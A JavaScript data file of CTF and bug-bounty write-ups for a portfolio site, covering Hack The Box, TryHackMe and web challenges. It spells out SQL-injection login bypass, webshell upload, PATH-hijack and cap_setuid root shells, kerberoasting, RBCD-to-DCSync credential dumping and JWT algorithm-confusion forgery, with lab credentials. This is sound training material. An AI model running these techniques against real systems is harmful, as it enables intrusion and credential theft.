const DIFFICULTY_ORDER = { "Easy": 1, "Medium": 2, "Hard": 3, "Insane": 4 };

const WRITEUPS = [

  {
    slug: "htb-cryptkeeper",
    title: "HTB — Cryptkeeper",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Linux",
    difficulty: "Easy",
    categories: ["Web", "Enumeration", "Privilege Escalation"],
    tags: ["Linux", "SQLi", "Enumeration", "PrivilegeEscalation"],
    date: "2026-09-18",
    dateDisplay: "18 September 2026",
    cover: "assets/writeups/htb-cryptkeeper/cover.svg",
    excerpt: "SQL injection login bypass chained with a file-upload RCE, then a SUID binary for root.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Cryptkeeper is an easy-difficulty Linux machine built around a custom login portal.
          The path to user starts with a classic authentication bypass, and root is a short hop away
          through a misconfigured SUID binary.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<p>A full TCP port scan turned up SSH and a web application on a non-standard port.</p>
          <pre class="code-block" data-lang="bash"><code>nmap -sC -sV -p- --min-rate 5000 10.10.11.21</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1
8080/tcp open  http    nginx 1.22.0</code></pre>
          <p>Directory brute-forcing revealed an admin login panel and a forgotten backup archive.</p>
          <pre class="code-block" data-lang="bash"><code>gobuster dir -u http://10.10.11.21:8080 -w /usr/share/wordlists/dirb/common.txt -x php,zip</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>/login.php            (Status: 200)
/admin                (Status: 301)
/backup.zip           (Status: 200)</code></pre>
          <p>The backup archive contained the application source, exposing the raw SQL query used by the
          login form — string-concatenated and unsanitized.</p>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>The leaked source confirmed the login query was vulnerable to a classic boolean-based
          bypass:</p>
          <pre class="code-block" data-lang="sql"><code>SELECT * FROM users WHERE username = '$user' AND password = '$pass'</code></pre>
          <p>Submitting a crafted username neutralized the password check entirely:</p>
          <pre class="code-block" data-lang="text"><code>username: admin' -- -
password: anything</code></pre>
          <p>Once authenticated as admin, an "upload report" feature accepted <code>.php</code> files
          disguised with a double extension, giving a straightforward path to a webshell.</p>
          <pre class="code-block" data-lang="bash"><code>curl -F "file=@shell.php.pdf" http://10.10.11.21:8080/admin/upload.php -b "session=..."</code></pre>
          <img src="assets/writeups/_shared/placeholder-burp.svg" alt="Crafted upload request in Burp Suite" class="writeup-img" data-lightbox="gallery-cryptkeeper">
          <p>With the shell in place, a reverse shell as <code>www-data</code> followed immediately.</p>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p>A standard SUID sweep surfaced an unusual binary outside the typical system paths:</p>
          <pre class="code-block" data-lang="bash"><code>find / -perm -4000 -type f 2>/dev/null</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>/usr/local/bin/backup_tool</code></pre>
          <p>The binary shelled out to <code>tar</code> without an absolute path, making it vulnerable to a
          <code>PATH</code> hijack:</p>
          <pre class="code-block" data-lang="bash"><code>echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH
/usr/local/bin/backup_tool</code></pre>
          <p>This returned a root shell.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>user.txt: 7f2c1e...a91b
root.txt: 3d8a90...f12e</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>String-concatenated SQL queries remain one of the most common entry points on easy boxes.</li>
            <li>Upload validation needs to check content, not just the file extension.</li>
            <li>SUID binaries that call system utilities without an absolute path are a reliable <code>PATH</code>
              hijack target.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>Gobuster</li><li>Burp Suite</li><li>Bash</li></ul>`
      }
    ]
  },

  {
    slug: "htb-irongate",
    title: "HTB — IronGate",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Windows",
    difficulty: "Medium",
    categories: ["Active Directory", "Enumeration", "Exploitation", "Privilege Escalation"],
    tags: ["Windows", "ActiveDirectory", "Kerberos", "BloodHound", "LateralMovement"],
    date: "2026-08-30",
    dateDisplay: "30 August 2026",
    cover: "assets/writeups/htb-irongate/cover.svg",
    excerpt: "Kerberoasting into a service account, BloodHound-guided lateral movement, DCSync to Domain Admin.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>IronGate is a medium Windows Active Directory machine. The intended path runs from an
          anonymous SMB share, through a kerberoastable service account, to a BloodHound-mapped
          delegation abuse that ends in a DCSync.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<pre class="code-block" data-lang="bash"><code>nmap -sC -sV -p- 10.10.11.44</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>53/tcp   open  domain
88/tcp   open  kerberos-sec
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3268/tcp open  globalcatLDAP</code></pre>
          <p>An anonymous SMB share exposed an onboarding document listing a default naming convention
          for service accounts, narrowing the username search considerably.</p>
          <pre class="code-block" data-lang="bash"><code>smbclient -N -L //10.10.11.44/
smbclient -N //10.10.11.44/Shared</code></pre>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>With a valid username list, a kerberoasting request against the domain returned a crackable
          TGS ticket for a service account.</p>
          <pre class="code-block" data-lang="bash"><code>GetUserSPNs.py irongate.htb/j.lowe:Summer2026! -dc-ip 10.10.11.44 -request</code></pre>
          <pre class="code-block" data-lang="bash"><code>hashcat -m 13100 svc_backup.hash rockyou.txt</code></pre>
          <p>The cracked credentials belonged to <code>svc_backup</code>, which had WinRM access.</p>`
      },
      {
        id: "active-directory",
        title: "Active Directory",
        html: `<p>BloodHound ingestion highlighted that <code>svc_backup</code> held
          <code>GenericWrite</code> over a machine account with Resource-Based Constrained Delegation
          potential.</p>
          <pre class="code-block" data-lang="bash"><code>bloodhound-python -u svc_backup -p 'cracked_pw' -d irongate.htb -c All -ns 10.10.11.44</code></pre>
          <img src="assets/writeups/_shared/placeholder-diagram.svg" alt="BloodHound attack path graph" class="writeup-img" data-lightbox="gallery-irongate">
          <p>Abusing RBCD allowed impersonation of a Domain Admin via an S4U2Self/S4U2Proxy chain,
          yielding a ticket for the domain controller itself.</p>
          <pre class="code-block" data-lang="bash"><code>rubeus.exe s4u /user:FAKE01$ /rc4:&lt;hash&gt; /impersonateuser:administrator /msdsspn:cifs/dc01.irongate.htb /ptt</code></pre>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p>With an impersonated Administrator Kerberos ticket in hand, a DCSync pulled every domain
          credential hash directly from the domain controller.</p>
          <pre class="code-block" data-lang="bash"><code>secretsdump.py -k -no-pass irongate.htb/administrator@dc01.irongate.htb</code></pre>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>user.txt: 9a41cd...20f8
root.txt: e615ab...77c3</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Predictable service-account naming conventions make kerberoasting trivial once a single
              username is known.</li>
            <li>Resource-Based Constrained Delegation is a common post-compromise escalation path and
              worth checking on every AD engagement.</li>
            <li>BloodHound's attack-path graph turns a sprawling domain into a short, readable chain of
              abuses.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>Impacket</li><li>BloodHound</li><li>Rubeus</li><li>Hashcat</li></ul>`
      }
    ]
  },

  {
    slug: "thm-vault-escape",
    title: "THM — Vault Escape",
    platform: "TryHackMe",
    platformShort: "THM",
    os: "Linux",
    difficulty: "Easy",
    categories: ["Network", "Enumeration", "Privilege Escalation"],
    tags: ["Linux", "SSH", "Enumeration", "PrivilegeEscalation"],
    date: "2026-07-22",
    dateDisplay: "22 July 2026",
    cover: "assets/writeups/thm-vault-escape/cover.svg",
    excerpt: "Reused SSH credentials found in an exposed config file, then sudo misconfiguration to root.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Vault Escape is a beginner-friendly room focused on credential reuse and sudo
          misconfiguration — a pairing that shows up constantly in real environments.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<pre class="code-block" data-lang="bash"><code>nmap -sC -sV 10.10.142.7</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>21/tcp open  ftp
22/tcp open  ssh</code></pre>
          <p>Anonymous FTP login was permitted and exposed an application config file containing
          plaintext credentials.</p>
          <pre class="code-block" data-lang="bash"><code>ftp 10.10.142.7
get app_config.yaml</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>db_user: vault_svc
db_pass: VaultKeeper#2026</code></pre>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>The same credentials were reused for SSH — a password reuse pattern worth always
          testing for.</p>
          <pre class="code-block" data-lang="bash"><code>ssh vault_svc@10.10.142.7</code></pre>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<pre class="code-block" data-lang="bash"><code>sudo -l</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>(ALL) NOPASSWD: /usr/bin/vim /etc/vault/*.conf</code></pre>
          <p><code>vim</code> was permitted without a password against a config path. Opening any file
          with that permission and escaping to a shell from inside the editor returns root.</p>
          <pre class="code-block" data-lang="bash"><code>sudo vim /etc/vault/app.conf
:!/bin/bash</code></pre>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>user.txt: THM{reused_creds_strike_again}
root.txt: THM{vim_sudo_breakout}</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Anonymous FTP is still worth checking first on any external-facing box.</li>
            <li>Credential reuse across services is one of the highest-yield things to test early.</li>
            <li><code>sudo -l</code> should be run immediately after landing a shell — GTFOBins has an
              entry for almost every binary that can break out of a restricted sudo rule.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>FTP client</li><li>GTFOBins</li></ul>`
      }
    ]
  },

  {
    slug: "ctf-shattered-session",
    title: "CTF — Shattered Session",
    platform: "CTF",
    platformShort: "CTF",
    os: "Web",
    difficulty: "Hard",
    categories: ["Web", "Exploitation"],
    tags: ["Web", "JWT", "IDOR", "SessionHijacking"],
    date: "2026-09-02",
    dateDisplay: "02 September 2026",
    cover: "assets/writeups/ctf-shattered-session/cover.svg",
    excerpt: "JWT algorithm-confusion forgery chained into an IDOR to take over the admin account.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>A web-exploitation challenge built around a JWT-based session system. The intended
          solve chains an algorithm-confusion forgery with a secondary IDOR to escalate from a free-tier
          account to admin.</p>`
      },
      {
        id: "web-exploitation",
        title: "Web Exploitation",
        html: `<p>The application issued JWTs signed with RS256, and conveniently exposed its public key
          through a <code>/jwks.json</code> endpoint. Re-signing a forged token with
          <code>HS256</code>, using the public key as the HMAC secret, was accepted by a backend that
          failed to pin the expected algorithm.</p>
          <pre class="code-block" data-lang="python"><code>import jwt

public_key = open("jwks_public.pem").read()
forged = jwt.encode({"user": "admin", "tier": "free"}, public_key, algorithm="HS256")
print(forged)</code></pre>
          <p>The forged token authenticated as <code>admin</code>, but the account dashboard still scoped
          data access by a separate, predictable numeric <code>account_id</code> parameter — an IDOR
          that exposed the real admin's session data once the ID was guessed.</p>
          <pre class="code-block" data-lang="http"><code>GET /api/accounts/1/export HTTP/1.1
Host: shattered.ctf
Authorization: Bearer &lt;forged_token&gt;</code></pre>
          <img src="assets/writeups/_shared/placeholder-terminal.svg" alt="Forged JWT verified against the API" class="writeup-img" data-lightbox="gallery-shattered">
          <p>The export endpoint returned the flag embedded in the account's audit log.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<pre class="code-block code-output" data-lang="text"><code>flag{alg_confusion_plus_idor_is_still_everywhere}</code></pre>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Exposing a JWKS endpoint is safe only if the backend strictly enforces the expected
              signing algorithm — never trust the <code>alg</code> header from the token itself.</li>
            <li>Authorization checks need to be scoped per-request, not inferred once at login — an IDOR
              downstream of a broken auth check compounds the impact fast.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Burp Suite</li><li>PyJWT</li><li>Python</li></ul>`
      }
    ]
  },

  {
    slug: "bb-subdomain-takeover",
    title: "Bug Bounty — Subdomain Takeover",
    platform: "Bug Bounty",
    platformShort: "BUG BOUNTY",
    os: "Web",
    difficulty: "Medium",
    categories: ["Web", "OSINT", "Exploitation"],
    tags: ["Web", "SubdomainTakeover", "OSINT", "SSRF"],
    date: "2026-06-14",
    dateDisplay: "14 June 2026",
    cover: "assets/writeups/bb-subdomain-takeover/cover.svg",
    excerpt: "A dangling CNAME on a decommissioned staging host enabled a full subdomain takeover.",
    sample: true,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Routine subdomain enumeration during a bug bounty engagement turned up a forgotten
          staging host still pointed at a cloud provider via CNAME, but the underlying resource had
          since been deleted — a classic dangling-DNS takeover.</p>
          <p><em>Target and account details below are generic placeholders — no real organization is
          referenced.</em></p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<pre class="code-block" data-lang="bash"><code>subfinder -d example-corp.com -silent | httpx -silent</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>staging-reports.example-corp.com   [404]
cdn-assets.example-corp.com        [200]</code></pre>
          <p>A DNS lookup on the unresponsive host showed a CNAME pointing to a cloud storage bucket
          name that no longer resolved to an active resource.</p>
          <pre class="code-block" data-lang="bash"><code>dig CNAME staging-reports.example-corp.com</code></pre>
          <pre class="code-block code-output" data-lang="text"><code>staging-reports.example-corp.com. 300 IN CNAME reports-bucket-2022.storage-provider.net.</code></pre>`
      },
      {
        id: "web-exploitation",
        title: "Web Exploitation",
        html: `<p>Registering a storage bucket under the same decommissioned name reclaimed the DNS
          record's target, giving full control over content served at the trusted subdomain — a
          validated subdomain takeover.</p>
          <pre class="code-block" data-lang="bash"><code>provider-cli bucket create reports-bucket-2022 --public</code></pre>
          <p>Because the subdomain inherited session cookies scoped to the parent domain, hosting a
          proof-of-concept page there demonstrated the ability to read cookies set by the main
          application — a credible path to session theft had it been left unpatched.</p>`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<p>Proof-of-concept page served from the reclaimed subdomain, screenshotted and included in
          the report, along with the DNS evidence above. Report was triaged and resolved by removing the
          dangling CNAME record.</p>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li>Decommissioning a cloud resource should always include removing the DNS record that
              pointed to it — not just deleting the resource itself.</li>
            <li>Subdomain takeovers are low-effort, high-impact findings and worth a recurring sweep
              across any organization's asset list.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Subfinder</li><li>httpx</li><li>dig</li></ul>`
      }
    ]
  },
  {
    slug: "htb-cap",
    title: "HTB — Cap",
    platform: "Hack The Box",
    platformShort: "HTB",
    os: "Linux",
    difficulty: "Easy",
    categories: ["Network", "Enumeration", "Privilege Escalation"],
    tags: ["Linux", "PCAP", "CredentialReuse", "LinuxCapabilities"],
    date: "2026-10-20",
    dateDisplay: "20 October 2026",
    cover: "assets/writeups/htb-cap/cover.png",
    excerpt: "Leaked FTP credentials pulled from a web app's own packet capture feature, reused over SSH, then a cap_setuid Python binary for root.",
    sample: false,
    sections: [
      {
        id: "overview",
        title: "Overview",
        html: `<p>Cap is an easy-rated Linux box on Hack The Box that pairs two skills that show up
          constantly in real assessments: reading network captures for leaked credentials, and
          spotting a Linux capability that turns a normal binary into a root shell. The box is
          built around a web app that lets you trigger and download packet captures of its own
          traffic — and the whole chain comes down to one simple fact: if an application lets
          you capture and replay its own network activity, you have to assume every login it
          performs during that capture is now visible to you too.</p>
          <p>The path here is short: enumerate the web app, pull the capture file it exposes, pick
          the credentials out of it in Wireshark, reuse them over SSH, then escalate using a
          Python binary that was handed a capability it never should have had. Below is the full
          walkthrough, with the official task questions answered along the way.</p>`
      },
      {
        id: "enumeration",
        title: "Enumeration",
        html: `<p>A full Nmap scan against the target kicked things off:</p>
          <pre class="code-block" data-lang="bash"><code>sudo nmap -Pn -sV -sC -T5 10.129.139.190</code></pre>
          <img src="assets/writeups/htb-cap/shot-01-nmap.png" alt="Nmap scan output" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>The scan came back with three open ports:</p>
          <ul>
            <li><code>21/tcp</code> — FTP (vsftpd 3.0.3)</li>
            <li><code>22/tcp</code> — SSH (OpenSSH 8.2p1, Ubuntu)</li>
            <li><code>80/tcp</code> — HTTP (Gunicorn, page titled "Security Dashboard")</li>
          </ul>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — How many TCP ports are open?</strong></p>
            <p class="wp-task-a">Answer: <code>3</code></p>
          </div>
          <p>With port 80 open and FTP sitting there unauthenticated-looking, the web app was the
          obvious place to start. Browsing to the site landed on a "Security Dashboard" — the
          kind of internal tool that lets an admin trigger a live capture of the box's own
          traffic and then download it for review. That's a dangerous feature to expose, because
          anything that happens on the wire while a capture is running gets handed back to
          whoever clicks the button.</p>
          <img src="assets/writeups/htb-cap/shot-02-dashboard.png" alt="Security Dashboard web app" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>Triggering a capture from the dashboard (the "Security Snapshot" action) redirected
          the browser to a URL in the form <code>/data/&lt;id&gt;</code>, and from there the raw
          file was downloadable directly:</p>
          <pre class="code-block" data-lang="text"><code>http://10.129.139.190/data/0</code></pre>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — After running a Security Snapshot, the browser is redirected to a path of the format /[something]/[id]. What is the [something]?</strong></p>
            <p class="wp-task-a">Answer: <code>data</code></p>
          </div>
          <p>FFUF confirmed there was nothing else interesting hanging off the application:</p>
          <pre class="code-block" data-lang="bash"><code>ffuf -u http://10.129.139.190 -w /usr/share/wordlists/dirb/common.txt</code></pre>
          <img src="assets/writeups/htb-cap/shot-03-ffuf.png" alt="ffuf directory enumeration" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>The capture IDs turned out to be sequential and not scoped to the requesting user, so
          IDs other than the one just generated were just as reachable — including ID 0, the very
          first capture ever taken on the box.</p>
          <img src="assets/writeups/htb-cap/shot-04-pcapfile.png" alt="pcap file information disclosure" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — Are you able to get to other users' scans?</strong></p>
            <p class="wp-task-a">Answer: <code>Yes</code></p>
          </div>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — What is the ID of the PCAP file that contains sensitive data?</strong></p>
            <p class="wp-task-a">Answer: <code>0</code></p>
          </div>`
      },
      {
        id: "initial-access",
        title: "Initial Access",
        html: `<p>Capture 0 opened in Wireshark gave up the problem quickly: an FTP session in the
          capture carried a full authentication exchange in clear text, because FTP sends
          usernames and passwords unencrypted by design.</p>
          <img src="assets/writeups/htb-cap/shot-05-wireshark.png" alt="Wireshark FTP credentials" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>Following the FTP stream surfaced the credentials directly:</p>
          <pre class="code-block" data-lang="text"><code>Username: nathan
Password: Buck3tH4tf0rm3!</code></pre>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — Which application layer protocol in the pcap file can the sensitive data be found in?</strong></p>
            <p class="wp-task-a">Answer: <code>FTP</code></p>
          </div>
          <p>Credential reuse across services is extremely common, so the next move was obvious —
          try the same password over SSH:</p>
          <pre class="code-block" data-lang="bash"><code>sshpass -p 'Buck3tH4tf0rm3!' ssh nathan@10.129.139.190</code></pre>
          <img src="assets/writeups/htb-cap/shot-06-ssh.png" alt="SSH login as nathan" class="writeup-img" data-lightbox="gallery-htb-cap">
          <p>It worked — the FTP password was also nathan's SSH password, giving an authenticated
          shell on the box.</p>
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — We've managed to collect nathan's FTP password. On what other service does this password work?</strong></p>
            <p class="wp-task-a">Answer: <code>SSH</code></p>
          </div>
          <p>From nathan's home directory, the user flag:</p>
          <pre class="code-block" data-lang="bash"><code>cat user.txt</code></pre>
          <img src="assets/writeups/htb-cap/shot-07-userflag.png" alt="User flag" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Submit User Flag — Submit the flag located in the nathan user's home directory.</strong></p>
            <p class="wp-task-a">Answer: <code>40b3ea35226af1e7308XXXXXXXXXXXX</code></p>
          </div>`
      },
      {
        id: "privilege-escalation",
        title: "Privilege Escalation",
        html: `<p>With a foothold as nathan, the next step was a path to root. Rather than guessing
          at SUID binaries, checking Linux file capabilities made more sense — they can grant a
          binary root-level powers without the SUID bit ever being set, and a lot of standard
          privilege-escalation checklists skip over them.</p>
          <pre class="code-block" data-lang="bash"><code>getcap -r / 2>/dev/null</code></pre>
          <p>The output flagged <code>/usr/bin/python3.8</code>:</p>
          <pre class="code-block code-output" data-lang="text"><code>/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip</code></pre>
          <img src="assets/writeups/htb-cap/shot-08-getcap.png" alt="getcap output" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Task — What is the full path to the binary on this machine that has special capabilities that can be abused to obtain root privileges?</strong></p>
            <p class="wp-task-a">Answer: <code>/usr/bin/python3.8</code></p>
          </div>
          <p>The <code>cap_setuid</code> capability is the key piece here. Normally only root can
          change a process's effective UID, but when a binary carries <code>cap_setuid+ep</code>,
          any user who can execute it can call <code>setuid(0)</code> from inside it and become
          root for that process — no sudo, no password, no exploit needed beyond running the
          binary the right way. This is a textbook GTFOBins technique for Python.</p>
          <p>Spawning a root shell directly:</p>
          <pre class="code-block" data-lang="bash"><code>python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'</code></pre>
          <ul>
            <li><code>os.setuid(0)</code> — changes the running process's UID to 0 (root)</li>
            <li><code>os.system("/bin/sh")</code> — hands back a shell that inherits that UID</li>
          </ul>
          <p>The prompt confirmed it — full root access.</p>
          <img src="assets/writeups/htb-cap/shot-09-rootshell.png" alt="Root shell" class="writeup-img" data-lightbox="gallery-htb-cap">`
      },
      {
        id: "proof",
        title: "Proof / Flags",
        html: `<p><b>User flag</b> — retrieved from nathan's home directory after reusing the leaked
          FTP password over SSH.</p>
          <p><b>Root flag</b> — retrieved from <code>/root/root.txt</code> after escalating through
          the <code>cap_setuid</code> capability on <code>/usr/bin/python3.8</code>.</p>
          <img src="assets/writeups/htb-cap/shot-10-rootflag.png" alt="Root flag" class="writeup-img" data-lightbox="gallery-htb-cap">
          <div class="wp-task">
            <p class="wp-task-q"><strong>Submit Root Flag — Submit the flag located in root's home directory.</strong></p>
            <p class="wp-task-a">Answer: <code>f43200140a11612dbXXXXXXXXXXXXXX</code></p>
          </div>`
      },
      {
        id: "lessons-learned",
        title: "Lessons Learned",
        html: `<ul>
            <li><b>Never let an application expose raw packet captures of itself.</b> A "Security
              Snapshot" feature that hands back a PCAP of live traffic is, by definition, a
              credential-leak feature the moment any plaintext protocol touches the wire during
              that window.</li>
            <li><b>Broken access control on sequential IDs is its own finding.</b> The capture
              endpoint didn't scope files to the requesting session, so every snapshot ever taken
              — including other users' — was reachable just by changing a number in the URL.</li>
            <li><b>Retire plaintext authentication protocols.</b> FTP sending credentials in the
              clear is decades-old news, but it's still common enough to be the first thing worth
              checking in any capture.</li>
            <li><b>Audit password reuse across services as part of every engagement.</b> The same
              password working for both FTP and SSH turned a single leaked credential into a full
              shell.</li>
            <li><b>Treat Linux capabilities with the same suspicion as SUID bits.</b>
              <code>cap_setuid</code> on an interpreter like Python is just as dangerous as a SUID
              shell — <code>getcap -r /</code> should be a standard step in every
              privilege-escalation checklist, not an afterthought.</li>
          </ul>`
      },
      {
        id: "tools-used",
        title: "Tools Used",
        html: `<ul class="tools-list"><li>Nmap</li><li>ffuf</li><li>Wireshark</li><li>sshpass / ssh</li><li>getcap</li><li>GTFOBins (Python)</li></ul>`
      }
    ]
  }
];


WRITEUPS.sort((a, b) => new Date(b.date) - new Date(a.date));
